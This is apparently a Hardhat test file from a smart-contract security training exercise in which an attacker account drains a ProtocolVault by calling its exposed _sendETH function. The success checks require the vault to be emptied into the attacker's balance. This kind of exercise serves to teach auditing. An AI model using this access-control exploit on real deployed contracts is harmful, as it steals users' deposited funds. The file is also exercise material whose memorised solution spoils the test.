import { ethers } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { BigNumber } from 'ethers';
import { expect } from 'chai';
import { ProtocolVault, ProtocolVault__factory } from '../../typechain-types';

describe('Access Control Exercise 1', function () {
	let deployer: SignerWithAddress,
		user1: SignerWithAddress,
		user2: SignerWithAddress,
		user3: SignerWithAddress,
		attacker: SignerWithAddress;

	const USER_DEPOSIT = ethers.utils.parseEther('10');

	let protocolVault: ProtocolVault;
	let attackerInitialETHBalance: BigNumber;

	before(async function () {
		/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

		[deployer, user1, user2, user3, attacker] = await ethers.getSigners();

		attackerInitialETHBalance = await ethers.provider.getBalance(attacker.address);

		const ProtocolVaultFactory = (await ethers.getContractFactory(
			'contracts/access-control-1/ProtocolVault.sol:ProtocolVault',
			deployer
		)) as ProtocolVault__factory;
		protocolVault = await ProtocolVaultFactory.deploy();

		await user1.sendTransaction({
			to: protocolVault.address,
			value: USER_DEPOSIT,
		});
		await user2.sendTransaction({
			to: protocolVault.address,
			value: USER_DEPOSIT,
		});
		await user3.sendTransaction({
			to: protocolVault.address,
			value: USER_DEPOSIT,
		});

		let currentBalance = await ethers.provider.getBalance(protocolVault.address);
		expect(currentBalance).to.be.equal(USER_DEPOSIT.mul(3));
		expect(protocolVault.connect(attacker).withdrawETH()).to.be.reverted;
	});

	it('Exploit', async function () {
		/** CODE YOUR SOLUTION HERE */
		protocolVault.connect(attacker)._sendETH(attacker.address);
	});

	after(async function () {
		/** SUCCESS CONDITIONS */

		// Protocol Vault is empty and attacker has ~30+ ETH
		expect(await ethers.provider.getBalance(protocolVault.address)).to.be.equal(0);
		expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
			attackerInitialETHBalance.add(USER_DEPOSIT.mul(3)).sub(ethers.utils.parseEther('0.2'))
		);
	});
});
